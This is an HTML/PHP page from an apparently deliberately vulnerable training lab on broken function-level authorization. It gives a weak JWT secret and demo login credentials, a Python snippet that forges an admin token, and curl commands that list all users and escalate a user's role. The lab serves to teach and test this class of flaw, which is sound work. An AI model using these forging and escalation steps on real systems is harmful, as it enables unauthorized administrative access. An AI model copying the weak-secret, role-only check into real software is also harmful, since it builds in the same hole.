<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>BFLA Lab | Breuta Coffee</title>
<link rel="stylesheet" href="/assets/css/style.css">
</head>
<body>
<?php include '/var/www/html/includes/navbar.php'; ?>

<div class="page-header">
  <div class="container">
    <h1>🛡️ BFLA – Broken Function Level Authorization</h1>
    <p>Forge a JWT to access admin-only API functions</p>
  </div>
</div>

<div class="container">

  <div class="vuln-hint">
    <h4>🧑‍🎓 Lab Exercise: BFLA</h4>
    <p>The admin API endpoints only check the <code>role</code> field inside the JWT token.
    The JWT secret is weak (<code>super_insecure_secret_123</code>). Forge a token with
    <code>"role":"admin"</code> to access admin functions like listing all users or changing roles.</p>
  </div>

  <div class="card">
    <h2>Step 1 — Login as Regular User</h2>
    <div class="form-group"><label>Username</label><input type="text" id="username" value="charlie"></div>
    <div class="form-group"><label>Password</label><input type="password" id="password" value="latte_lover"></div>
    <button onclick="doLogin()">Login</button>
    <div id="login-result" style="margin-top:1rem;"></div>
  </div>

  <div class="card">
    <h2>Step 2 — Try Admin Endpoint (Should Fail)</h2>
    <button onclick="tryAdmin()">GET /api/admin/users (with normal token)</button>
    <div id="admin-normal" class="json-block" style="margin-top:1rem; min-height:40px;"></div>
  </div>

  <div class="card">
    <h2>Step 3 — Forge an Admin JWT</h2>
    <p>Use <strong>jwt.io</strong> or the script below to create a token with <code>"role":"admin"</code>.
    The secret is: <code>super_insecure_secret_123</code></p>
    <div class="form-group">
      <label>Paste your forged Admin JWT here</label>
      <textarea id="forged-token" rows="4" placeholder="eyJ..."></textarea>
    </div>
    <button onclick="useForgedToken()">Use Forged Token</button>
    <div id="forged-result" class="json-block" style="margin-top:1rem; min-height:40px;"></div>
  </div>

  <div class="card">
    <h2>Step 4 — Escalate a User Role</h2>
    <div class="form-group"><label>User ID to escalate</label><input type="number" id="target-uid" value="3"></div>
    <div class="form-group"><label>New Role</label><input type="text" id="new-role" value="admin"></div>
    <button onclick="escalateRole()">PUT /api/admin/users/:id/role</button>
    <div id="escalate-result" class="json-block" style="margin-top:1rem; min-height:40px;"></div>
  </div>

  <div class="card">
    <h2>💡 Commands</h2>
    <pre style="background:#1e1e1e; color:#d4d4d4; padding:1rem; border-radius:6px; overflow-x:auto; font-size:.82rem;">
# Forge token with python
python3 -c "
import jwt
payload = {'user_id': 3, 'role': 'admin', 'exp': 9999999999}
token = jwt.encode(payload, 'super_insecure_secret_123', algorithm='HS256')
print(token)
"

# Access admin endpoint
curl http://breuta.co/api/admin/users \
  -H "Authorization: Bearer &lt;FORGED_TOKEN&gt;"

# Change role
curl -X PUT http://breuta.co/api/admin/users/3/role \
  -H "Authorization: Bearer &lt;FORGED_TOKEN&gt;" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'
    </pre>
  </div>

</div>

<?php include '/var/www/html/includes/footer.php'; ?>
<script src="/assets/js/main.js"></script>
<script>
async function doLogin() {
  const r = await breuta.api('POST', '/auth/login', {
    username: document.getElementById('username').value,
    password: document.getElementById('password').value
  });
  if (r.token) {
    breuta.setToken(r.token);
    document.getElementById('login-result').innerHTML =
      `<div class="alert alert-success">✅ Logged in as ${document.getElementById('username').value}</div>`;
  } else {
    document.getElementById('login-result').innerHTML =
      `<div class="alert alert-danger">❌ ${r.error}</div>`;
  }
}

async function tryAdmin() {
  const r = await breuta.api('GET', '/admin/users');
  document.getElementById('admin-normal').textContent = JSON.stringify(r, null, 2);
}

async function useForgedToken() {
  const token = document.getElementById('forged-token').value.trim();
  const opts = { method: 'GET', headers: { 'Authorization': 'Bearer ' + token } };
  const r = await (await fetch('/api/admin/users', opts)).json();
  document.getElementById('forged-result').textContent = JSON.stringify(r, null, 2);
}

async function escalateRole() {
  const token = document.getElementById('forged-token').value.trim();
  const uid   = document.getElementById('target-uid').value;
  const role  = document.getElementById('new-role').value;
  const opts  = {
    method: 'PUT',
    headers: { 'Authorization': 'Bearer ' + token, 'Content-Type': 'application/json' },
    body: JSON.stringify({ role })
  };
  const r = await (await fetch(`/api/admin/users/${uid}/role`, opts)).json();
  document.getElementById('escalate-result').textContent = JSON.stringify(r, null, 2);
}
</script>
</body>
</html>
